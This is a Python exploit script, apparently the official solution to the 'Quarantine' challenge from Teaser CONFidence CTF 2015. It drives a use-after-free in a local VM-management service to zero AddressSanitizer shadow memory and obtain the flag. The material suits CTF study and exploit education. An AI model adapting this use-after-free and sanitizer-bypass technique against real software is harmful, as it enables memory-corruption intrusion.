#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Quarantine
# Competition:      Teaser CONFidence CTF 2015
# Category:         Software exploitation
# Scoring:          500 pts (hard)
# Number of solves: 5 out of 160 teams

import struct
import socket
import telnetlib

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer

def add(s, name, program_length, program, array_length):
  read_until(s, "Option: ")
  s.send("add\n")
  s.send("%s\n" % name)
  s.send("%u\n" % program_length)
  s.send("%s\n" % program)
  s.send("%u\n" % array_length)
  read_until(s, "Done.")

def remove(s, idx):
  read_until(s, "Option: ")
  s.send("remove\n")
  s.send("%u\n" % idx)
  read_until(s, "Done.")

def change(s, idx, program):
  read_until(s, "Option: ")
  s.send("change\n")
  s.send("%u\n" % idx)
  s.send("%s\n" % program)
  read_until(s, "Done.")

def select(s, idx):
  read_until(s, "Option: ")
  s.send("select\n")
  s.send("%u\n" % idx)
  read_until(s, "Done.")

def run(s):
  read_until(s, "Option: ")
  s.send("run\n")

def give_flag(s):
  read_until(s, "Option: ")
  s.send("give_me_the_flag\n")

def fill_with_zeros_new_object(s, address, size):
  # First, create a ("test1", 64, 1MB) VM, which will be later used after
  # free.
  add(s, "test1", 64, "test", 1024 * 1024)

  # Add another bogus entry, because the bug only triggers when there are >1
  # entries on the list and the removed one is not the first on the list.
  add(s, "test2", 10, "test", 10)

  # Select the "test1" VM, being the 2nd on the list (reverse order).
  select(s, 2)

  # Remove the "test1" VM, resulting in a dangling globals::current_vm pointer.
  remove(s, 2)

  # Create a ("test3", 64, 1MB) VM and instantly remove it to populate the
  # AddressSanitizer quarantine.
  add(s, "test3", 64, "test", 1024 * 1024)
  remove(s, 1)

  # Create a VM, whose program 64-byte long program allocation will overlap with
  # the vm::VMState object pointed to by globals::current_vm. Set the fields of
  # the object as follows:
  # 
  # ->array           = <stack shadow address>
  # ->array_length    = 16
  # ->program         = NULL
  # ->program_length  = 0
  # ->array_idx       = 0
  # ->next            = NULL
  # ->name            = "\0"
  add(s, "exploit", 64, struct.pack('<QIQIIQ', address, size, 0, 0, 0, 0), 1024 * 1024)

  # "Start" the overwritten vm::VMState program execution, triggering the
  # use-after-free. This operation will result in overwriting bytes at the
  # selected address with zeros.
  run(s)

def fill_with_zeros_existing_object(s, idx, address, size):
  # First, modify the existing vm::VMState object pointed to by
  # globals::current_vm.
  change(s, idx, struct.pack('<QIQIIQ', address, size, 0, 0, 0, 0))

  # "Start" the overwritten vm::VMState program execution, triggering the
  # use-after-free. This operation will result in overwriting bytes at the
  # selected address with zeros.
  run(s)

def main():
  # Firstly, connect in order to obtain the address of stack shadow memory
  # blocking us from issuing the "give_me_the_flag" command.
  s = socket.socket()
  s.connect(("127.0.0.1", 10000))

  read_until(s, "Option: ")
  s.send("give_me_the_flag\n")
  read_until(s, "=>")
  stack_shadow_address = int(read_until(s, ": ")[:-2], 16)
  s.close()

  print "[+] Stack shadow memory address: %x" % (stack_shadow_address)

  # Secondly, overwrite the stack shadow memory with zeros and determine the
  # address of the static memory shadow area, so that we can overwrite that, too.
  s = socket.socket()
  s.connect(("127.0.0.1", 10000))

  fill_with_zeros_new_object(s, stack_shadow_address, 17)
  give_flag(s)
  read_until(s, "=>")
  static_shadow_address = int(read_until(s, ": ")[:-2], 16)
  s.close()

  print "[+] Static shadow memory address: %x" % (static_shadow_address)

  # Lastly, overwrite both the stack and static shadow memory areas with zeros,
  # then successfully issue the "give_me_the_flag" command.
  s = socket.socket()
  s.connect(("127.0.0.1", 10000))

  fill_with_zeros_new_object(s, stack_shadow_address, 17)
  fill_with_zeros_existing_object(s, 1, static_shadow_address, 33)
  give_flag(s)

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
